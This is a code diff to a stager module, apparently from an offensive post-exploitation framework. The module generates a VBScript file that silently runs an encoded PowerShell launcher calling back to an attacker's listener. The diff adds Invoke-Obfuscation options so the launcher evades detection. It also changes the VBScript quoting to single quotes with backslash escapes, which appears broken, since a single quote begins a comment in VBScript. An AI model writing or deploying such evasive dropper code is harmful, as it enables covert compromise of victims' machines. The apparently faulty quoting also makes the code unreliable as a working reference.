@@ -35,6 +35,16 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   '/tmp/launcher.vbs'
             },
+            'Obfuscate' : {
+                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+            'ObfuscateCommand' : {
+                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True.',
+                'Required'      :   False,
+                'Value'         :   'Token,All,1,home,Encoding,3,home,Launcher,STDIN++,12467'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -67,13 +77,19 @@ class Stager:
 
         # extract all of our options
         listenerName = self.options['Listener']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
         
+        obfuscateScript = False
+        if obfuscate.lower() == "true":
+            obfuscateScript = True
+
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
@@ -81,7 +97,7 @@ class Stager:
         else:
             code = "Dim objShell\n"
             code += "Set objShell = WScript.CreateObject(\"WScript.Shell\")\n"
-            code += "command = \""+launcher+"\"\n"
+            code += "command = '"+launcher.replace("'", "\\'")+"'\n"
             code += "objShell.Run command,0\n"
             code += "Set objShell = Nothing\n"
 
